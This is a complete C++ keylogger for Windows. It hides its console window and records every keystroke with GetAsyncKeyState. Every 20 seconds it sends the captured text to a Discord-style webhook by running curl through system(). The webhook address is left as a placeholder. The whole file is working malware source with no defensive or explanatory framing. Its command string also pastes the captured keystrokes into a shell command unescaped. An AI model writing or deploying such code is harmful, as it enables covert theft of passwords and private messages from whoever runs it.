#define _WIN32_WINNT 0x0500
#include <iostream>
#include <string>
#include <windows.h>
#include <map>
#include <chrono>

std::string get_key_string(int key, bool shift_pressed) {
    static std::map<int, std::string> special_keys = {
        {VK_RETURN, " `ENTER` "}, {VK_BACK, " `BACKSPACE` "}, {VK_SHIFT, " `SHIFT` "},
        {VK_CAPITAL, " `CAPSLOCK` "}, {VK_DELETE, " `DELETE` "}, {VK_SPACE, " "}
    };

    if (special_keys.find(key) != special_keys.end()) return special_keys[key];
    if ((key >= 65 && key <= 90) || (key >= 48 && key <= 57)) return std::string(1, shift_pressed ? (char)key : tolower((char)key));
    return "";
}

void send_to_webhook(const std::string &buffer, const std::string &webhook_url) {
    std::string command = "curl -s -X POST -H \"Content-Type: application/json\" -d \"{\\\"content\\\": \\\"" + buffer + "\\\"}\" " + webhook_url + " >nul 2>&1";
    system(command.c_str());
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::string webhook_url = "WEBHOOK_HERE";
    std::string buffer;
    auto start_time = std::chrono::steady_clock::now();

    while (true) {
        for (int key = 1; key <= 255; key++) {
            SHORT key_state = GetAsyncKeyState(key);
            if (key_state == -32767) {
                bool shift_pressed = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
                std::string key_str = get_key_string(key, shift_pressed);
                if (!key_str.empty()) buffer.append(key_str);
            }
        }

        Sleep(1);

        if (std::chrono::duration_cast<std::chrono::seconds>(std::chrono::steady_clock::now() - start_time).count() >= 20) {
            if (!buffer.empty()) {
                send_to_webhook(buffer, webhook_url);
                buffer.clear();
            }
            start_time = std::chrono::steady_clock::now();
        }
    }
    return 0;
}
